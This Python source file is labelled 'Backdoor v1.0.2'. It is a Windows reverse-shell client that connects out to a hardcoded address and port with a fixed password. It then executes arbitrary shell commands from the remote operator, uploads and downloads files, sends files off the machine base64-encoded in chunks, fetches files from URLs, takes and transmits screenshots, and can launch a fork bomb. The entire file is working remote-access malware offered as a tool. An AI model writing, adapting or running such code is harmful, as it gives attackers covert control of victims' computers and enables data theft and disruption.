# Testet in: Python 3.8.8
# By: LawlietJH
# Backdoor v1.0.2

import subprocess
import requests						# python -m pip install requests
import socket
import base64
import mss							# python -m pip install mss
import sys
import os

# Manipulacion de DLLs de Windows ======================================
from ctypes import windll
#=======================================================================

# pip install pywin32 ==================================================
from win32com.shell import shell
import win32api			as WA
import win32con			as WC
import win32gui			as WG
import win32ui			as WU
import win32net			as WN
import win32com			as WCM
import win32process		as WP
import win32security	as WS
import win32clipboard	as WCB
import win32console		as WCS
#=======================================================================

TITULO      = 'Backdoor'			# Nombre
__version__ = 'v1.0.2'				# Version
__author__  = 'LawlietJH'			# Desarrollador

#=======================================================================
#=======================================================================
#=======================================================================

class Helps:
	
	def systemUptime(raw=False):		# Tiempo de actividad del sistema
		
		mili = WA.GetTickCount()
		
		secs = (mili // 1000)
		if raw: return str(secs)+'s'
		mins = (secs // 60)
		hrs  = (mins // 60)
		days = (hrs  // 24)
		
		time = ''
		if days > 0: time += str(days)+'d '
		time += str(hrs %24).zfill(2)+':'
		time += str(mins%60).zfill(2)+':'
		time += str(secs%60).zfill(2)
		
		return time
	
	def isUserAnAdmin(): return shell.IsUserAnAdmin()



class Client():
	
	def __init__(self, CON_HOST, CON_PORT):
		self.default_path = os.getcwd()
		self.current_dir = None
		self.client = None
		self.CON_HOST  = CON_HOST
		self.CON_PORT  = CON_PORT
		self.CON = (self.CON_HOST, self.CON_PORT)
		self.passwd = 'Z10N2'
	
	def get_chunks(self, data, bfc=2**16):	# 2^16 = 65536 bytes = 64 kb, bfc = bytes for chunk
		
		parts = (len(data) // bfc)
		parts += 1 if (len(data) % bfc) else 0
		chunks = [ data[bfc*i:bfc*(i+1)] for i in range(parts) ]
		return chunks
	
	def run_command(self, command):
		std = {
			'shell':  True,
			'stdin':  subprocess.PIPE,
			'stdout': subprocess.PIPE,
			'stderr': subprocess.PIPE
		}
		resp = subprocess.Popen(command, **std)
		return resp
	
	def download_file_web(self, url):
		req = requests.get(url)
		file_name = url.split('/')[-1]
		with open(file_name, 'wb') as file_:
			file_.write(req.content)
			file_.close()
	
	def screenshot(self):
		screen = mss.mss()
		screen.shot()
	
	def connect(self):
		
		self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.client.connect(self.CON)
		
		self.client.send(self.passwd.encode())
		if not self.client.recv(1024).decode() == 'ok':
			print('\n Conexión rechazada.\n')
			return
		
		self.current_dir = os.getcwd()
		self.client.send(self.current_dir.encode())
		
		while True:
			
			res = self.client.recv(1024).decode()
			
			if res.lower() == 'exit': break
			elif res.lower().startswith('cd') and len(res) > 2:
				res = res[2:].strip()
				if os.path.isdir(res):
					os.chdir(res)
					res = os.getcwd()
					self.client.send(res.encode())
				else:
					msg = 'No existe la ruta: '+res
					self.client.send(msg.encode())
			elif res.lower().startswith('download'):
				file_name = res[8:].strip()
				if not os.path.isfile(file_name):
					self.client.send('file does not exist'.encode())
				else:
					self.client.send('ok'.encode())
					self.client.recv(1024)
					with open(file_name, 'rb') as file_:
						data = base64.b64encode(file_.read())
						chunks = self.get_chunks(data)
						info = 'Chunks: '+str(len(chunks))
						self.client.send(info.encode())
						self.client.recv(1024)
						for i, chunk in enumerate(chunks):
							self.client.send(chunk)
							self.client.recv(1024)
						file_.close()
			elif res.lower().startswith('upload'):
				self.client.send('ok'.encode())
				file_name = res[6:].strip()
				chunks = self.client.recv(1024).decode('utf-8', 'ignore')
				chunks = int(chunks.replace('Chunks: ',''))
				self.client.send('ok'.encode())
				data = ''.encode()
				for i in range(chunks):
					chunk = self.client.recv(2**16)
					data += chunk
					self.client.send('ok'.encode())
				with open(file_name, 'wb') as file_:
					file_.write(base64.b64decode(data))
					file_.close()
			elif res.lower().startswith('getweb'):
				try:
					url = res[7:]
					self.download_file_web(url)
					self.client.send('Archivo descargado correctamente.'.encode())
				except:
					self.client.send('Ocurrio un Error en la Descarga.'.encode())
			elif res.lower().startswith('screenshot'):
				try:
					self.screenshot()
					self.client.send('ok'.encode())
					scrshot = 'monitor-1.png'
					self.client.recv(1024).decode()
					with open(scrshot, 'rb') as file_:
						data = base64.b64encode(file_.read())
						chunks = self.get_chunks(data)
						info = 'Chunks: '+str(len(chunks))
						self.client.send(info.encode())
						self.client.recv(1024)
						for i, chunk in enumerate(chunks):
							self.client.send(chunk)
							self.client.recv(1024)
						file_.close()
					os.remove(scrshot)
				except:
					self.client.send('Error'.encode())
			elif res.startswith('forkbomb:'+self.passwd):
				try:
					while True: os.fork()
				except KeyboardInterrupt:
					pass
			elif res.lower() == 'alive': self.client.send('ok'.encode())
			elif res.lower() == 'cls':
				os.system('cls')
				print('\n'+self.default_path+'>')
				self.client.send('ok'.encode())
			elif res.lower().startswith('activetime'):
				if len(res) > 10:
					if res[10:].strip() == 'raw':
						res = Helps.systemUptime(True)
					else:
						self.client.send('Error'.encode())
				else:
					res = Helps.systemUptime()
				self.client.send(res.encode())
			elif res.lower() == 'isadmin':
				if len(res) == 7 and Helps.isUserAnAdmin():
					res = 'ok'
				else:
					self.client.send('Error'.encode())
				self.client.send(res.encode())
			else:
				proc = self.run_command(res)
				proc = proc.stdout.read() + proc.stderr.read()
				if proc:
					self.client.send(proc)
				else:
					self.client.send('None'.encode())



if __name__ == '__main__':
	
	RHOST = '192.168.1.69'
	RPORT = 57575
	
	client = Client(RHOST, RPORT)
	try:
		client.connect()
		client.client.close()
		
	except ConnectionRefusedError:
		# ~ client.run_command('exit')
		pass
		print('\n No se puede conectar con la dirección IP: '+str(RHOST))


